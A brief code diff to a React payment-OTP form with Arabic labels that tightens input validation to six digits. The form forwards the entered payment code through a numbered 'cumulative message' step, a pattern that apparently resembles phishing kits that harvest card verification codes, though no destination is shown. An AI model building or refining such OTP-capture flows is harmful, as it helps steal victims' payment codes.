@@ -20,7 +20,7 @@ const PaymentOTP = () => {
   const [otp, setOtp] = useState("");
 
   const handleVerify = async () => {
-    if (otp.length === 4 || otp.length === 6) {
+    if (otp.length === 6) {
       const newData = { paymentOtp: otp };
       updateData(newData);
       await sendCumulativeMessage(5, "رمز تأكيد الدفع", newData);
@@ -110,7 +110,7 @@ const PaymentOTP = () => {
               <Button 
                 className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1"
                 onClick={handleVerify}
-                disabled={otp.length !== 4 && otp.length !== 6}
+                disabled={otp.length !== 6}
               >
                 تأكيد
               </Button>
